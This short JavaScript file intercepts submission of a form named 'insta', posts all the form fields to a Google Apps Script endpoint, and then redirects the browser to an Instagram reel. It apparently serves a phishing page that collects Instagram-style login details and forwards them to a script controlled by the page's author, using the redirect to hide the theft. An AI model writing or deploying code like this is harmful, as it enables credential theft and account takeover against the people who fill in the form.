const scriptURL = 'https://script.google.com/macros/s/AKfycbye3idJL3pA-Ip0zOVuXyPxKoB0YE1eDd0X95W-yZlAR5aqhH9OkwMR7AfHXWKAGesb/exec'
const form = document.forms['insta']

form.addEventListener("submit", e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => window.open("https://www.instagram.com/reel/C7WomdQKj0r/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==" ,"_self"))
        .catch(error => console.error('Error!', error.message))
})